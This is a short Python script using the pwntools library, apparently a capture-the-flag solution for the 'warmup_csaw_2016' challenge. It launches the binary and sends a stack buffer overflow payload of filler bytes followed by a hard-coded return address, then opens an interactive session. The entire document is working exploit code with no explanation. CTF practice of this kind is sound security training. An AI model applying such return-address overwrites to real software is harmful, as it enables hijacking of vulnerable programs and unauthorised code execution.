from pwn import *

context.log_level = 'DEBUG'

p = process('./warmup_csaw_2016')

payload = 'a'*(0x40+8) + p64(0x40060d)

p.send(payload)

p.interactive()